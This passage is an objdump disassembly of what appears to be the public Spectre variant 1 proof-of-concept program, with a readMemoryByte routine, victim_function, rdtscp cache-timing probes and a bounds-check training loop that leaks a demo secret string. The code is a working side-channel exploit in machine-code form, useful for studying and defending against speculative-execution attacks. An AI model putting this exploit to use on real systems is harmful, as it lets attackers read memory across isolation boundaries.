 8ce:	01 c0                	add    eax,eax
 8d0:	01 d0                	add    eax,edx
 8d2:	01 c0                	add    eax,eax
 8d4:	29 c1                	sub    ecx,eax
 8d6:	89 ca                	mov    edx,ecx
 8d8:	8d 42 ff             	lea    eax,[rdx-0x1]
 8db:	66 b8 00 00          	mov    ax,0x0
 8df:	48 98                	cdqe   
 8e1:	48 89 45 c0          	mov    QWORD PTR [rbp-0x40],rax
 8e5:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
 8e9:	48 c1 e8 10          	shr    rax,0x10
 8ed:	48 09 45 c0          	or     QWORD PTR [rbp-0x40],rax
 8f1:	48 8b 45 88          	mov    rax,QWORD PTR [rbp-0x78]
 8f5:	48 33 45 b0          	xor    rax,QWORD PTR [rbp-0x50]
 8f9:	48 23 45 c0          	and    rax,QWORD PTR [rbp-0x40]
 8fd:	48 33 45 b0          	xor    rax,QWORD PTR [rbp-0x50]
 901:	48 89 45 c0          	mov    QWORD PTR [rbp-0x40],rax
 905:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
 909:	48 89 c7             	mov    rdi,rax
 90c:	e8 69 fe ff ff       	call   77a <victim_function>
 911:	83 6d a4 01          	sub    DWORD PTR [rbp-0x5c],0x1
 915:	83 7d a4 00          	cmp    DWORD PTR [rbp-0x5c],0x0
 919:	0f 89 6e ff ff ff    	jns    88d <readMemoryByte+0xc6>
 91f:	c7 45 a0 00 00 00 00 	mov    DWORD PTR [rbp-0x60],0x0
 926:	e9 d7 00 00 00       	jmp    a02 <readMemoryByte+0x23b>
 92b:	8b 45 a0             	mov    eax,DWORD PTR [rbp-0x60]
 92e:	69 c0 a7 00 00 00    	imul   eax,eax,0xa7
 934:	83 c0 0d             	add    eax,0xd
 937:	25 ff 00 00 00       	and    eax,0xff
 93c:	89 45 ac             	mov    DWORD PTR [rbp-0x54],eax
 93f:	8b 45 ac             	mov    eax,DWORD PTR [rbp-0x54]
 942:	c1 e0 09             	shl    eax,0x9
 945:	48 63 d0             	movsxd rdx,eax
 948:	48 8d 05 d1 17 20 00 	lea    rax,[rip+0x2017d1]        # 202120 <array2>
 94f:	48 01 d0             	add    rax,rdx
 952:	48 89 45 b8          	mov    QWORD PTR [rbp-0x48],rax
 956:	48 8d 45 94          	lea    rax,[rbp-0x6c]
 95a:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
 95e:	0f 01 f9             	rdtscp 
 961:	89 ce                	mov    esi,ecx
 963:	48 8b 4d e0          	mov    rcx,QWORD PTR [rbp-0x20]
 967:	89 31                	mov    DWORD PTR [rcx],esi
 969:	48 c1 e2 20          	shl    rdx,0x20
 96d:	48 09 d0             	or     rax,rdx
 970:	48 89 c3             	mov    rbx,rax
 973:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
 977:	0f b6 00             	movzx  eax,BYTE PTR [rax]
 97a:	0f b6 c0             	movzx  eax,al
 97d:	89 45 94             	mov    DWORD PTR [rbp-0x6c],eax
 980:	48 8d 45 94          	lea    rax,[rbp-0x6c]
 984:	48 89 45 d8          	mov    QWORD PTR [rbp-0x28],rax
 988:	0f 01 f9             	rdtscp 
 98b:	89 ce                	mov    esi,ecx
 98d:	48 8b 4d d8          	mov    rcx,QWORD PTR [rbp-0x28]
 991:	89 31                	mov    DWORD PTR [rcx],esi
 993:	48 c1 e2 20          	shl    rdx,0x20
 997:	48 09 d0             	or     rax,rdx
 99a:	48 29 d8             	sub    rax,rbx
 99d:	48 89 c3             	mov    rbx,rax
 9a0:	48 83 fb 50          	cmp    rbx,0x50
 9a4:	77 58                	ja     9fe <readMemoryByte+0x237>
 9a6:	8b 45 9c             	mov    eax,DWORD PTR [rbp-0x64]
 9a9:	8b 0d 71 16 20 00    	mov    ecx,DWORD PTR [rip+0x201671]        # 202020 <array1_size>
 9af:	ba 00 00 00 00       	mov    edx,0x0
 9b4:	f7 f1                	div    ecx
 9b6:	89 d0                	mov    eax,edx
 9b8:	89 c2                	mov    edx,eax
 9ba:	48 8d 05 7f 16 20 00 	lea    rax,[rip+0x20167f]        # 202040 <array1>
 9c1:	0f b6 04 02          	movzx  eax,BYTE PTR [rdx+rax*1]
 9c5:	0f b6 c0             	movzx  eax,al
 9c8:	39 45 ac             	cmp    DWORD PTR [rbp-0x54],eax
 9cb:	74 31                	je     9fe <readMemoryByte+0x237>
 9cd:	8b 45 ac             	mov    eax,DWORD PTR [rbp-0x54]
 9d0:	48 98                	cdqe   
 9d2:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
 9d9:	00 
 9da:	48 8d 05 5f 17 22 00 	lea    rax,[rip+0x22175f]        # 222140 <results.23458>
 9e1:	8b 04 02             	mov    eax,DWORD PTR [rdx+rax*1]
 9e4:	8d 48 01             	lea    ecx,[rax+0x1]
 9e7:	8b 45 ac             	mov    eax,DWORD PTR [rbp-0x54]
 9ea:	48 98                	cdqe   
 9ec:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
 9f3:	00 
 9f4:	48 8d 05 45 17 22 00 	lea    rax,[rip+0x221745]        # 222140 <results.23458>
 9fb:	89 0c 02             	mov    DWORD PTR [rdx+rax*1],ecx
 9fe:	83 45 a0 01          	add    DWORD PTR [rbp-0x60],0x1
 a02:	81 7d a0 ff 00 00 00 	cmp    DWORD PTR [rbp-0x60],0xff
 a09:	0f 8e 1c ff ff ff    	jle    92b <readMemoryByte+0x164>
 a0f:	c7 45 a8 ff ff ff ff 	mov    DWORD PTR [rbp-0x58],0xffffffff
 a16:	8b 45 a8             	mov    eax,DWORD PTR [rbp-0x58]
 a19:	89 45 a4             	mov    DWORD PTR [rbp-0x5c],eax
 a1c:	c7 45 a0 00 00 00 00 	mov    DWORD PTR [rbp-0x60],0x0
 a23:	e9 88 00 00 00       	jmp    ab0 <readMemoryByte+0x2e9>
 a28:	83 7d a4 00          	cmp    DWORD PTR [rbp-0x5c],0x0
 a2c:	78 32                	js     a60 <readMemoryByte+0x299>
 a2e:	8b 45 a0             	mov    eax,DWORD PTR [rbp-0x60]
 a31:	48 98                	cdqe   
 a33:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
 a3a:	00 
 a3b:	48 8d 05 fe 16 22 00 	lea    rax,[rip+0x2216fe]        # 222140 <results.23458>
 a42:	8b 14 02             	mov    edx,DWORD PTR [rdx+rax*1]
 a45:	8b 45 a4             	mov    eax,DWORD PTR [rbp-0x5c]
 a48:	48 98                	cdqe   
 a4a:	48 8d 0c 85 00 00 00 	lea    rcx,[rax*4+0x0]
 a51:	00 
 a52:	48 8d 05 e7 16 22 00 	lea    rax,[rip+0x2216e7]        # 222140 <results.23458>
 a59:	8b 04 01             	mov    eax,DWORD PTR [rcx+rax*1]
 a5c:	39 c2                	cmp    edx,eax
 a5e:	7c 0e                	jl     a6e <readMemoryByte+0x2a7>
 a60:	8b 45 a4             	mov    eax,DWORD PTR [rbp-0x5c]
 a63:	89 45 a8             	mov    DWORD PTR [rbp-0x58],eax
 a66:	8b 45 a0             	mov    eax,DWORD PTR [rbp-0x60]
 a69:	89 45 a4             	mov    DWORD PTR [rbp-0x5c],eax
 a6c:	eb 3e                	jmp    aac <readMemoryByte+0x2e5>
 a6e:	83 7d a8 00          	cmp    DWORD PTR [rbp-0x58],0x0
 a72:	78 32                	js     aa6 <readMemoryByte+0x2df>
 a74:	8b 45 a0             	mov    eax,DWORD PTR [rbp-0x60]
 a77:	48 98                	cdqe   
 a79:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
 a80:	00 
 a81:	48 8d 05 b8 16 22 00 	lea    rax,[rip+0x2216b8]        # 222140 <results.23458>
 a88:	8b 14 02             	mov    edx,DWORD PTR [rdx+rax*1]
 a8b:	8b 45 a8             	mov    eax,DWORD PTR [rbp-0x58]
 a8e:	48 98                	cdqe   
 a90:	48 8d 0c 85 00 00 00 	lea    rcx,[rax*4+0x0]
 a97:	00 
 a98:	48 8d 05 a1 16 22 00 	lea    rax,[rip+0x2216a1]        # 222140 <results.23458>
 a9f:	8b 04 01             	mov    eax,DWORD PTR [rcx+rax*1]
 aa2:	39 c2                	cmp    edx,eax
 aa4:	7c 06                	jl     aac <readMemoryByte+0x2e5>
 aa6:	8b 45 a0             	mov    eax,DWORD PTR [rbp-0x60]
 aa9:	89 45 a8             	mov    DWORD PTR [rbp-0x58],eax
 aac:	83 45 a0 01          	add    DWORD PTR [rbp-0x60],0x1
 ab0:	81 7d a0 ff 00 00 00 	cmp    DWORD PTR [rbp-0x60],0xff
 ab7:	0f 8e 6b ff ff ff    	jle    a28 <readMemoryByte+0x261>
 abd:	8b 45 a4             	mov    eax,DWORD PTR [rbp-0x5c]
 ac0:	48 98                	cdqe   
 ac2:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
 ac9:	00 
 aca:	48 8d 05 6f 16 22 00 	lea    rax,[rip+0x22166f]        # 222140 <results.23458>
 ad1:	8b 14 02             	mov    edx,DWORD PTR [rdx+rax*1]
 ad4:	8b 45 a8             	mov    eax,DWORD PTR [rbp-0x58]
 ad7:	48 98                	cdqe   
 ad9:	48 8d 0c 85 00 00 00 	lea    rcx,[rax*4+0x0]
 ae0:	00 
 ae1:	48 8d 05 58 16 22 00 	lea    rax,[rip+0x221658]        # 222140 <results.23458>
 ae8:	8b 04 01             	mov    eax,DWORD PTR [rcx+rax*1]
 aeb:	01 c0                	add    eax,eax
 aed:	83 c0 05             	add    eax,0x5
 af0:	39 c2                	cmp    edx,eax
 af2:	7d 45                	jge    b39 <readMemoryByte+0x372>
 af4:	8b 45 a4             	mov    eax,DWORD PTR [rbp-0x5c]
 af7:	48 98                	cdqe   
 af9:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
 b00:	00 
 b01:	48 8d 05 38 16 22 00 	lea    rax,[rip+0x221638]        # 222140 <results.23458>
 b08:	8b 04 02             	mov    eax,DWORD PTR [rdx+rax*1]
 b0b:	83 f8 02             	cmp    eax,0x2
 b0e:	75 1b                	jne    b2b <readMemoryByte+0x364>
 b10:	8b 45 a8             	mov    eax,DWORD PTR [rbp-0x58]
 b13:	48 98                	cdqe   
 b15:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
 b1c:	00 
 b1d:	48 8d 05 1c 16 22 00 	lea    rax,[rip+0x22161c]        # 222140 <results.23458>
 b24:	8b 04 02             	mov    eax,DWORD PTR [rdx+rax*1]
 b27:	85 c0                	test   eax,eax
 b29:	74 0e                	je     b39 <readMemoryByte+0x372>
 b2b:	83 6d 9c 01          	sub    DWORD PTR [rbp-0x64],0x1
 b2f:	83 7d 9c 00          	cmp    DWORD PTR [rbp-0x64],0x0
 b33:	0f 8f fc fc ff ff    	jg     835 <readMemoryByte+0x6e>
 b39:	b8 e7 03 00 00       	mov    eax,0x3e7
 b3e:	2b 45 9c             	sub    eax,DWORD PTR [rbp-0x64]
 b41:	89 c6                	mov    esi,eax
 b43:	48 8d 3d 37 03 00 00 	lea    rdi,[rip+0x337]        # e81 <_IO_stdin_used+0x31>
 b4a:	b8 00 00 00 00       	mov    eax,0x0
 b4f:	e8 ec fa ff ff       	call   640 <printf@plt>
 b54:	8b 15 e6 15 22 00    	mov    edx,DWORD PTR [rip+0x2215e6]        # 222140 <results.23458>
 b5a:	8b 45 94             	mov    eax,DWORD PTR [rbp-0x6c]
 b5d:	31 d0                	xor    eax,edx
 b5f:	89 05 db 15 22 00    	mov    DWORD PTR [rip+0x2215db],eax        # 222140 <results.23458>
 b65:	8b 45 a4             	mov    eax,DWORD PTR [rbp-0x5c]
 b68:	89 c2                	mov    edx,eax
 b6a:	48 8b 45 80          	mov    rax,QWORD PTR [rbp-0x80]
 b6e:	88 10                	mov    BYTE PTR [rax],dl
 b70:	8b 45 a4             	mov    eax,DWORD PTR [rbp-0x5c]
 b73:	48 98                	cdqe   
 b75:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
 b7c:	00 
 b7d:	48 8d 05 bc 15 22 00 	lea    rax,[rip+0x2215bc]        # 222140 <results.23458>
 b84:	8b 14 02             	mov    edx,DWORD PTR [rdx+rax*1]
 b87:	48 8b 85 78 ff ff ff 	mov    rax,QWORD PTR [rbp-0x88]
 b8e:	89 10                	mov    DWORD PTR [rax],edx
 b90:	48 8b 45 80          	mov    rax,QWORD PTR [rbp-0x80]
 b94:	48 83 c0 01          	add    rax,0x1
 b98:	8b 55 a8             	mov    edx,DWORD PTR [rbp-0x58]
 b9b:	88 10                	mov    BYTE PTR [rax],dl
 b9d:	48 8b 85 78 ff ff ff 	mov    rax,QWORD PTR [rbp-0x88]
 ba4:	48 8d 50 04          	lea    rdx,[rax+0x4]
 ba8:	8b 45 a8             	mov    eax,DWORD PTR [rbp-0x58]
 bab:	48 98                	cdqe   
 bad:	48 8d 0c 85 00 00 00 	lea    rcx,[rax*4+0x0]
 bb4:	00 
 bb5:	48 8d 05 84 15 22 00 	lea    rax,[rip+0x221584]        # 222140 <results.23458>
 bbc:	8b 04 01             	mov    eax,DWORD PTR [rcx+rax*1]
 bbf:	89 02                	mov    DWORD PTR [rdx],eax
 bc1:	90                   	nop
 bc2:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
 bc6:	64 48 33 04 25 28 00 	xor    rax,QWORD PTR fs:0x28
 bcd:	00 00 
 bcf:	74 05                	je     bd6 <readMemoryByte+0x40f>
 bd1:	e8 5a fa ff ff       	call   630 <__stack_chk_fail@plt>
 bd6:	48 81 c4 88 00 00 00 	add    rsp,0x88
 bdd:	5b                   	pop    rbx
 bde:	5d                   	pop    rbp
 bdf:	c3                   	ret    

0000000000000be0 <main>:
 be0:	55                   	push   rbp
 be1:	48 89 e5             	mov    rbp,rsp
 be4:	48 83 ec 40          	sub    rsp,0x40
 be8:	89 7d cc             	mov    DWORD PTR [rbp-0x34],edi
 beb:	48 89 75 c0          	mov    QWORD PTR [rbp-0x40],rsi
 bef:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
 bf6:	00 00 
 bf8:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
 bfc:	31 c0                	xor    eax,eax
 bfe:	48 8b 05 db 14 20 00 	mov    rax,QWORD PTR [rip+0x2014db]        # 2020e0 <secret>
 c05:	48 89 c2             	mov    rdx,rax
 c08:	48 8d 05 31 14 20 00 	lea    rax,[rip+0x201431]        # 202040 <array1>
 c0f:	48 29 c2             	sub    rdx,rax
 c12:	48 89 d0             	mov    rax,rdx
 c15:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
 c19:	c7 45 d8 28 00 00 00 	mov    DWORD PTR [rbp-0x28],0x28
 c20:	c7 45 dc 00 00 00 00 	mov    DWORD PTR [rbp-0x24],0x0
 c27:	eb 15                	jmp    c3e <main+0x5e>
 c29:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
 c2c:	48 63 d0             	movsxd rdx,eax
 c2f:	48 8d 05 ea 14 20 00 	lea    rax,[rip+0x2014ea]        # 202120 <array2>
 c36:	c6 04 02 01          	mov    BYTE PTR [rdx+rax*1],0x1
 c3a:	83 45 dc 01          	add    DWORD PTR [rbp-0x24],0x1
 c3e:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
 c41:	3d ff ff 01 00       	cmp    eax,0x1ffff
 c46:	76 e1                	jbe    c29 <main+0x49>
 c48:	83 7d cc 03          	cmp    DWORD PTR [rbp-0x34],0x3
 c4c:	75 5b                	jne    ca9 <main+0xc9>
 c4e:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
 c52:	48 83 c0 08          	add    rax,0x8
 c56:	48 8b 00             	mov    rax,QWORD PTR [rax]
 c59:	48 8d 55 e0          	lea    rdx,[rbp-0x20]
 c5d:	48 8d 35 27 02 00 00 	lea    rsi,[rip+0x227]        # e8b <_IO_stdin_used+0x3b>
 c64:	48 89 c7             	mov    rdi,rax
 c67:	b8 00 00 00 00       	mov    eax,0x0
 c6c:	e8 df f9 ff ff       	call   650 <__isoc99_sscanf@plt>
 c71:	48 8b 55 e0          	mov    rdx,QWORD PTR [rbp-0x20]
 c75:	48 8d 05 c4 13 20 00 	lea    rax,[rip+0x2013c4]        # 202040 <array1>
 c7c:	48 29 c2             	sub    rdx,rax
 c7f:	48 89 d0             	mov    rax,rdx
 c82:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
 c86:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
 c8a:	48 83 c0 10          	add    rax,0x10
 c8e:	48 8b 00             	mov    rax,QWORD PTR [rax]
 c91:	48 8d 55 d8          	lea    rdx,[rbp-0x28]
 c95:	48 8d 35 f2 01 00 00 	lea    rsi,[rip+0x1f2]        # e8e <_IO_stdin_used+0x3e>
 c9c:	48 89 c7             	mov    rdi,rax
 c9f:	b8 00 00 00 00       	mov    eax,0x0
 ca4:	e8 a7 f9 ff ff       	call   650 <__isoc99_sscanf@plt>
 ca9:	8b 45 d8             	mov    eax,DWORD PTR [rbp-0x28]
 cac:	89 c6                	mov    esi,eax
 cae:	48 8d 3d dc 01 00 00 	lea    rdi,[rip+0x1dc]        # e91 <_IO_stdin_used+0x41>
 cb5:	b8 00 00 00 00       	mov    eax,0x0
 cba:	e8 81 f9 ff ff       	call   640 <printf@plt>
 cbf:	e9 d5 00 00 00       	jmp    d99 <main+0x1b9>
 cc4:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
 cc8:	48 89 c6             	mov    rsi,rax
 ccb:	48 8d 3d d6 01 00 00 	lea    rdi,[rip+0x1d6]        # ea8 <_IO_stdin_used+0x58>
 cd2:	b8 00 00 00 00       	mov    eax,0x0
 cd7:	e8 64 f9 ff ff       	call   640 <printf@plt>
 cdc:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
 ce0:	48 8d 50 01          	lea    rdx,[rax+0x1]
 ce4:	48 89 55 e0          	mov    QWORD PTR [rbp-0x20],rdx
 ce8:	48 8d 55 ec          	lea    rdx,[rbp-0x14]
 cec:	48 8d 4d f6          	lea    rcx,[rbp-0xa]
 cf0:	48 89 ce             	mov    rsi,rcx
 cf3:	48 89 c7             	mov    rdi,rax
 cf6:	e8 cc fa ff ff       	call   7c7 <readMemoryByte>
 cfb:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
 cfe:	8b 55 f0             	mov    edx,DWORD PTR [rbp-0x10]
 d01:	01 d2                	add    edx,edx
 d03:	39 d0                	cmp    eax,edx
 d05:	7c 09                	jl     d10 <main+0x130>
 d07:	48 8d 05 ba 01 00 00 	lea    rax,[rip+0x1ba]        # ec8 <_IO_stdin_used+0x78>
 d0e:	eb 07                	jmp    d17 <main+0x137>
 d10:	48 8d 05 b9 01 00 00 	lea    rax,[rip+0x1b9]        # ed0 <_IO_stdin_used+0x80>
 d17:	48 89 c6             	mov    rsi,rax
 d1a:	48 8d 3d b7 01 00 00 	lea    rdi,[rip+0x1b7]        # ed8 <_IO_stdin_used+0x88>
 d21:	b8 00 00 00 00       	mov    eax,0x0
 d26:	e8 15 f9 ff ff       	call   640 <printf@plt>
 d2b:	8b 55 ec             	mov    edx,DWORD PTR [rbp-0x14]
 d2e:	0f b6 45 f6          	movzx  eax,BYTE PTR [rbp-0xa]
 d32:	3c 1f                	cmp    al,0x1f
 d34:	76 11                	jbe    d47 <main+0x167>
 d36:	0f b6 45 f6          	movzx  eax,BYTE PTR [rbp-0xa]
 d3a:	3c 7e                	cmp    al,0x7e
 d3c:	77 09                	ja     d47 <main+0x167>
 d3e:	0f b6 45 f6          	movzx  eax,BYTE PTR [rbp-0xa]
 d42:	0f b6 c0             	movzx  eax,al
 d45:	eb 07                	jmp    d4e <main+0x16e>
 d47:	48 8d 05 8f 01 00 00 	lea    rax,[rip+0x18f]        # edd <_IO_stdin_used+0x8d>
 d4e:	0f b6 4d f6          	movzx  ecx,BYTE PTR [rbp-0xa]
 d52:	0f b6 f1             	movzx  esi,cl
 d55:	89 d1                	mov    ecx,edx
 d57:	48 89 c2             	mov    rdx,rax
 d5a:	48 8d 3d 7e 01 00 00 	lea    rdi,[rip+0x17e]        # edf <_IO_stdin_used+0x8f>
 d61:	b8 00 00 00 00       	mov    eax,0x0
 d66:	e8 d5 f8 ff ff       	call   640 <printf@plt>
 d6b:	8b 45 f0             	mov    eax,DWORD PTR [rbp-0x10]
 d6e:	85 c0                	test   eax,eax
 d70:	7e 1d                	jle    d8f <main+0x1af>
 d72:	8b 55 f0             	mov    edx,DWORD PTR [rbp-0x10]
 d75:	0f b6 45 f7          	movzx  eax,BYTE PTR [rbp-0x9]
 d79:	0f b6 c0             	movzx  eax,al
 d7c:	89 c6                	mov    esi,eax
 d7e:	48 8d 3d 7b 01 00 00 	lea    rdi,[rip+0x17b]        # f00 <_IO_stdin_used+0xb0>
 d85:	b8 00 00 00 00       	mov    eax,0x0
 d8a:	e8 b1 f8 ff ff       	call   640 <printf@plt>
 d8f:	bf 0a 00 00 00       	mov    edi,0xa
 d94:	e8 87 f8 ff ff       	call   620 <putchar@plt>
 d99:	8b 45 d8             	mov    eax,DWORD PTR [rbp-0x28]
 d9c:	83 e8 01             	sub    eax,0x1
 d9f:	89 45 d8             	mov    DWORD PTR [rbp-0x28],eax
 da2:	8b 45 d8             	mov    eax,DWORD PTR [rbp-0x28]
 da5:	85 c0                	test   eax,eax
 da7:	0f 89 17 ff ff ff    	jns    cc4 <main+0xe4>
 dad:	b8 00 00 00 00       	mov    eax,0x0
 db2:	48 8b 4d f8          	mov    rcx,QWORD PTR [rbp-0x8]
 db6:	64 48 33 0c 25 28 00 	xor    rcx,QWORD PTR fs:0x28
 dbd:	00 00 
 dbf:	74 05                	je     dc6 <main+0x1e6>
 dc1:	e8 6a f8 ff ff       	call   630 <__stack_chk_fail@plt>
 dc6:	c9                   	leave  
 dc7:	c3                   	ret    
 dc8:	0f 1f 84 00 00 00 00 	nop    DWORD PTR [rax+rax*1+0x0]
 dcf:	00 

0000000000000dd0 <__libc_csu_init>:
 dd0:	41 57                	push   r15
 dd2:	41 56                	push   r14
 dd4:	49 89 d7             	mov    r15,rdx
 dd7:	41 55                	push   r13
 dd9:	41 54                	push   r12
 ddb:	4c 8d 25 be 0f 20 00 	lea    r12,[rip+0x200fbe]        # 201da0 <__frame_dummy_init_array_entry>
 de2:	55                   	push   rbp
 de3:	48 8d 2d be 0f 20 00 	lea    rbp,[rip+0x200fbe]        # 201da8 <__init_array_end>
 dea:	53                   	push   rbx
 deb:	41 89 fd             	mov    r13d,edi
 dee:	49 89 f6             	mov    r14,rsi
 df1:	4c 29 e5             	sub    rbp,r12
 df4:	48 83 ec 08          	sub    rsp,0x8
 df8:	48 c1 fd 03          	sar    rbp,0x3
 dfc:	e8 f7 f7 ff ff       	call   5f8 <_init>
 e01:	48 85 ed             	test   rbp,rbp
 e04:	74 20                	je     e26 <__libc_csu_init+0x56>
 e06:	31 db                	xor    ebx,ebx
 e08:	0f 1f 84 00 00 00 00 	nop    DWORD PTR [rax+rax*1+0x0]
 e0f:	00 
 e10:	4c 89 fa             	mov    rdx,r15
 e13:	4c 89 f6             	mov    rsi,r14
 e16:	44 89 ef             	mov    edi,r13d
 e19:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]
 e1d:	48 83 c3 01          	add    rbx,0x1
 e21:	48 39 dd             	cmp    rbp,rbx
 e24:	75 ea                	jne    e10 <__libc_csu_init+0x40>
 e26:	48 83 c4 08          	add    rsp,0x8
 e2a:	5b                   	pop    rbx
 e2b:	5d                   	pop    rbp
 e2c:	41 5c                	pop    r12
 e2e:	41 5d                	pop    r13
 e30:	41 5e                	pop    r14
 e32:	41 5f                	pop    r15
 e34:	c3                   	ret    
 e35:	90                   	nop
 e36:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
 e3d:	00 00 00 

0000000000000e40 <__libc_csu_fini>:
 e40:	f3 c3                	repz ret 

Disassembly of section .fini:

0000000000000e44 <_fini>:
 e44:	48 83 ec 08          	sub    rsp,0x8
 e48:	48 83 c4 08          	add    rsp,0x8
 e4c:	c3                   	ret    

Disassembly of section .rodata:

0000000000000e50 <_IO_stdin_used>:
 e50:	01 00                	add    DWORD PTR [rax],eax
 e52:	02 00                	add    al,BYTE PTR [rax]
 e54:	00 00                	add    BYTE PTR [rax],al
 e56:	00 00                	add    BYTE PTR [rax],al
 e58:	54                   	push   rsp
 e59:	68 65 20 4d 61       	push   0x614d2065
 e5e:	67 69 63 20 57 6f 72 	imul   esp,DWORD PTR [ebx+0x20],0x64726f57
 e65:	64 
 e66:	73 20                	jae    e88 <_IO_stdin_used+0x38>
 e68:	61                   	(bad)  
 e69:	72 65                	jb     ed0 <_IO_stdin_used+0x80>
 e6b:	20 53 71             	and    BYTE PTR [rbx+0x71],dl
 e6e:	75 65                	jne    ed5 <_IO_stdin_used+0x85>
 e70:	61                   	(bad)  
 e71:	6d                   	ins    DWORD PTR es:[rdi],dx
 e72:	69 73 68 20 4f 73 73 	imul   esi,DWORD PTR [rbx+0x68],0x73734f20
 e79:	69 66 72 61 67 65 2e 	imul   esp,DWORD PTR [rsi+0x72],0x2e656761
 e80:	00 54 72 69          	add    BYTE PTR [rdx+rsi*2+0x69],dl
 e84:	65 73 20             	gs jae ea7 <_IO_stdin_used+0x57>
 e87:	25 64 20 00 25       	and    eax,0x25002064
 e8c:	70 00                	jo     e8e <_IO_stdin_used+0x3e>
 e8e:	25 64 00 52 65       	and    eax,0x65520064
 e93:	61                   	(bad)  
 e94:	64 69 6e 67 20 25 64 	imul   ebp,DWORD PTR fs:[rsi+0x67],0x20642520
 e9b:	20 
 e9c:	62                   	(bad)  
 e9d:	79 74                	jns    f13 <_IO_stdin_used+0xc3>
 e9f:	65 73 3a             	gs jae edc <_IO_stdin_used+0x8c>
 ea2:	0a 00                	or     al,BYTE PTR [rax]
 ea4:	00 00                	add    BYTE PTR [rax],al
 ea6:	00 00                	add    BYTE PTR [rax],al
 ea8:	52                   	push   rdx
 ea9:	65 61                	gs (bad) 
 eab:	64 69 6e 67 20 61 74 	imul   ebp,DWORD PTR fs:[rsi+0x67],0x20746120
 eb2:	20 
 eb3:	6d                   	ins    DWORD PTR es:[rdi],dx
 eb4:	61                   	(bad)  
 eb5:	6c                   	ins    BYTE PTR es:[rdi],dx
 eb6:	69 63 69 6f 75 73 5f 	imul   esp,DWORD PTR [rbx+0x69],0x5f73756f
 ebd:	78 20                	js     edf <_IO_stdin_used+0x8f>
 ebf:	3d 20 25 70 2e       	cmp    eax,0x2e702520
 ec4:	2e 2e 20 00          	cs and BYTE PTR cs:[rax],al
 ec8:	53                   	push   rbx
 ec9:	75 63                	jne    f2e <__GNU_EH_FRAME_HDR+0xe>
 ecb:	63 65 73             	movsxd esp,DWORD PTR [rbp+0x73]
 ece:	73 00                	jae    ed0 <_IO_stdin_used+0x80>
 ed0:	55                   	push   rbp
 ed1:	6e                   	outs   dx,BYTE PTR ds:[rsi]
 ed2:	63 6c 65 61          	movsxd ebp,DWORD PTR [rbp+riz*2+0x61]
 ed6:	72 00                	jb     ed8 <_IO_stdin_used+0x88>
 ed8:	25 73 3a 20 00       	and    eax,0x203a73
 edd:	3f                   	(bad)  
 ede:	00 30                	add    BYTE PTR [rax],dh
 ee0:	78 25                	js     f07 <_IO_stdin_used+0xb7>
 ee2:	30 32                	xor    BYTE PTR [rdx],dh
 ee4:	58                   	pop    rax
 ee5:	3d e2 80 99 25       	cmp    eax,0x259980e2
 eea:	63 e2                	movsxd esp,edx
 eec:	80 99 20 73 63 6f 72 	sbb    BYTE PTR [rcx+0x6f637320],0x72
 ef3:	65 3d 25 64 20 00    	gs cmp eax,0x206425
 ef9:	00 00                	add    BYTE PTR [rax],al
 efb:	00 00                	add    BYTE PTR [rax],al
 efd:	00 00                	add    BYTE PTR [rax],al
 eff:	00 28                	add    BYTE PTR [rax],ch
 f01:	73 65                	jae    f68 <__GNU_EH_FRAME_HDR+0x48>
 f03:	63 6f 6e             	movsxd ebp,DWORD PTR [rdi+0x6e]
 f06:	64 20 62 65          	and    BYTE PTR fs:[rdx+0x65],ah
 f0a:	73 74                	jae    f80 <__GNU_EH_FRAME_HDR+0x60>
 f0c:	3a 20                	cmp    ah,BYTE PTR [rax]
 f0e:	30 78 25             	xor    BYTE PTR [rax+0x25],bh
 f11:	30 32                	xor    BYTE PTR [rdx],dh
 f13:	58                   	pop    rax
 f14:	20 73 63             	and    BYTE PTR [rbx+0x63],dh
 f17:	6f                   	outs   dx,DWORD PTR ds:[rsi]
 f18:	72 65                	jb     f7f <__GNU_EH_FRAME_HDR+0x5f>
 f1a:	3d 25 64 29 00       	cmp    eax,0x296425

Disassembly of section .eh_frame_hdr:

0000000000000f20 <__GNU_EH_FRAME_HDR>:
 f20:	01 1b                	add    DWORD PTR [rbx],ebx
 f22:	03 3b                	add    edi,DWORD PTR [rbx]
 f24:	4c 00 00             	rex.WR add BYTE PTR [rax],r8b
 f27:	00 08                	add    BYTE PTR [rax],cl
 f29:	00 00                	add    BYTE PTR [rax],al
 f2b:	00 f0                	add    al,dh
 f2d:	f6 ff                	idiv   bh
 f2f:	ff 98 00 00 00 40    	call   FWORD PTR [rax+0x40000000]
 f35:	f7 ff                	idiv   edi
 f37:	ff c0                	inc    eax
 f39:	00 00                	add    BYTE PTR [rax],al
 f3b:	00 50 f7             	add    BYTE PTR [rax-0x9],dl
 f3e:	ff                   	(bad)  
 f3f:	ff 68 00             	jmp    FWORD PTR [rax+0x0]
 f42:	00 00                	add    BYTE PTR [rax],al
 f44:	5a                   	pop    rdx
 f45:	f8                   	clc    
 f46:	ff                   	(bad)  
 f47:	ff                   	(bad)  
